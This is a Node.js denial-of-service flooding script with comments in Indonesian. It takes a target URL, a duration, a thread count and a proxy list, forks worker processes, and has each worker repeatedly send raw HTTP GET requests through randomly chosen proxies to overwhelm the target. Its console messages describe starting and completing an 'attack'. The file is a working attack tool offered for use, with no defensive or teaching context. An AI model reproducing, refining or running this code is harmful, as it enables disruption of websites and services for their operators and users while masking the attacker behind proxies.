const cluster = require('cluster');
const fs = require('fs');
const tls = require('tls');
const net = require('net');
const { URL } = require('url');

if (process.argv.length < 7) {
    console.error("Usage: node script.js <url> <time> <rps> <threads> <proxy.txt>");
    process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3], 10);
const rps = parseInt(process.argv[4], 10);
const threads = parseInt(process.argv[5], 10);
const proxyFile = process.argv[6];

let proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim());

if (proxies.length === 0) {
    console.error("Error: Proxy file is empty or cannot be read.");
    process.exit(1);
}

// Fungsi untuk memilih proxy acak dari pool
function getRandomProxy() {
    const randomIndex = Math.floor(Math.random() * proxies.length);
    return proxies[randomIndex];
}

if (cluster.isMaster) {
    console.log(`Starting attack on ${targetURL} for ${duration} seconds using ${threads} threads`);

    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log("Attack completed.");
        process.exit(0);
    }, duration * 1000);

    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.process.pid} exited`);
    });
} else {
    const target = new URL(targetURL);
    const startTime = Date.now();

    let activeProxy = null; // Menyimpan proxy aktif

    // Fungsi untuk mengirim raw data melalui socket atau tls
    function sendRawOrTLSRequest() {
        let proxy = activeProxy ? activeProxy : getRandomProxy(); // Gunakan proxy aktif jika ada
        const proxyParts = proxy.trim().split(":");
        if (proxyParts.length < 2) return;

        const proxyHost = proxyParts[0];
        const proxyPort = parseInt(proxyParts[1], 10);

        // Tentukan apakah menggunakan raw TCP atau TLS (SSL)
        const useTLS = target.protocol === 'https:';

        const client = useTLS ? tls.connect(proxyPort, proxyHost, () => {
            activeProxy = proxy; // Tandai proxy yang aktif
            startFlood(client);
        }) : net.connect(proxyPort, proxyHost, () => {
            activeProxy = proxy; // Tandai proxy yang aktif
            startFlood(client);
        });

        client.on("error", () => {
            console.log(`Proxy ${proxy} failed. Trying another proxy...`);
            client.destroy();
            // Jika proxy gagal, pilih proxy baru
            activeProxy = null; // Reset proxy aktif yang gagal
            sendRawOrTLSRequest(); // Coba proxy lain
        });

        client.on("close", () => {
            client.destroy();
        });
    }

    // Fungsi untuk memulai flood request
    function startFlood(client) {
        function flood() {
            if (Date.now() - startTime >= duration * 1000) {
                console.log(`Worker ${process.pid} stopping attack.`);
                process.exit(0);
            }

            // Mengirimkan raw data ke target server
            const request = `GET ${target.pathname} HTTP/1.1\r\n` +
                            `Host: ${target.hostname}\r\n` +
                            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" +
                            "Accept: */*\r\n" +
                            "Connection: keep-alive\r\n\r\n";
            client.write(request);

            setTimeout(flood, 50); // Mengatur waktu delay flood menjadi 50ms
        }
        flood();
    }

    function attackLoop() {
        if (Date.now() - startTime >= duration * 1000) {
            console.log(`Worker ${process.pid} stopping attack.`);
            process.exit(0);
        }

        // Kirim permintaan ke target menggunakan proxy acak dari pool atau proxy aktif
        sendRawOrTLSRequest();

        setTimeout(attackLoop, 10); // Delay kecil agar CPU tidak overload
    }

    process.on('uncaughtException', (err) => {
        console.error('Uncaught exception:', err);
        process.exit(1);
    });

    attackLoop();
}
